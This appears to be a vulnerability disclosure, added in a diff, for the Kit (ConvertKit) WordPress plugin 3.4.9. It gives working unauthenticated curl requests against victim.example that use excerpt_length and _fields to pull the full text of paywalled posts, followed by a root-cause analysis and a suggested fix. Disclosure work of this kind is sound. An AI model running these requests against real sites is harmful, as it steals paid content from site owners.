@@ -1,0 +1,120 @@
+ENVIRONMENT
+-----------
+
+  WordPress      7.1.2
+  Plugin         Kit (formerly ConvertKit) 3.4.9
+  Released       2026-11-03, the latest version
+  Tested         2026-11-03, clean install, default theme, no other plugins
+
+
+PRECONDITIONS
+-------------
+
+Two settings, both normal on any site that uses Member Content.
+
+  1. The Kit account is connected, so an access token and a refresh token exist.
+
+     Why it matters: can_view_post() returns true immediately when
+     has_access_and_refresh_token() is false. The paywall only engages
+     on a connected site.
+
+  2. A published post is restricted to a product, with no manual excerpt
+     and no more tag. That is the default for most posts.
+
+
+TEST POST
+
+  ID             4
+  Stored body    518 characters after stripping tags
+  First marker   SECRET-TOKEN-7731
+  Last marker    END-OF-PAID-BODY
+
+The two markers make it obvious whether a response holds a truncated
+preview or the complete paid article.
+
+
+STEP 1 - CONFIRM THE PAYWALL WORKS
+----------------------------------
+
+  curl -s 'http://victim.example/?rest_route=/wp/v2/posts/4'
+
+Result:
+
+  content.rendered    340 chars, ends in an ellipsis
+  END-OF-PAID-BODY    absent
+
+The restriction is working on the content field.
+
+
+STEP 2 - BYPASS IT IN THAT SAME RESPONSE
+----------------------------------------
+
+excerpt.rendered is never restricted.
+
+WordPress 6.6 and later accept an excerpt_length parameter from
+unauthenticated callers, so the excerpt can be stretched over the
+whole body.
+
+  curl -s 'http://victim.example/?rest_route=/wp/v2/posts/4&excerpt_length=100000'
+
+Result, in one single JSON object:
+
+  content.rendered    340 chars, END-OF-PAID-BODY absent
+  excerpt.rendered    518 chars, both markers present
+
+518 chars is byte for byte the full stored body.
+
+One field is restricted. The other field, in the very same response,
+hands over the complete paid article.
+
+
+STEP 3 - BULK HARVEST
+---------------------
+
+  curl -s 'http://victim.example/?rest_route=/wp/v2/posts&per_page=100&excerpt_length=100000&_fields=id,excerpt'
+
+Raw response, trimmed to the restricted post:
+
+  [{"id":4,"excerpt":{"rendered":"<p>SECRET-TOKEN-7731 ... END-OF-PAID-BODY<\/p>\n",
+    "protected":false}}]
+
+One unauthenticated request returns the full text of every restricted
+post on the site.
+
+
+ROOT CAUSE
+----------
+
+File: includes/class-convertkit-output-restrict-content.php
+
+  maybe_restrict_rest_content() rewrites only data['content']['rendered'],
+  at lines 803 and 826 in 3.4.9.
+
+  The excerpt field of the same response is never touched.
+
+  The only excerpt guard in that class is maybe_restrict_feed_excerpt(),
+  hooked to the RSS filter the_excerpt_rss. It does not apply to the REST API.
+
+A second, independent route exists. The filter opens with:
+
+  if ( ! isset( $response->data['content']['rendered'] ) ) {
+      return $response;
+  }
+
+So a request that drops the content field, for example _fields=id,excerpt,
+makes the filter return without restricting anything at all.
+
+  Step 3   uses that route
+  Step 2   shows the leak also happens when the filter does run
+
+
+SUGGESTED FIX
+-------------
+
+Restrict data['excerpt']['rendered'] alongside data['content']['rendered'],
+and rebuild it from the already restricted preview, not from the full body.
+
+Capping excerpt_length alone is not enough. WordPress regenerates the excerpt
+from the post content whenever no manual excerpt exists.
+
+The same reasoning applies to any other response field derived from post content.
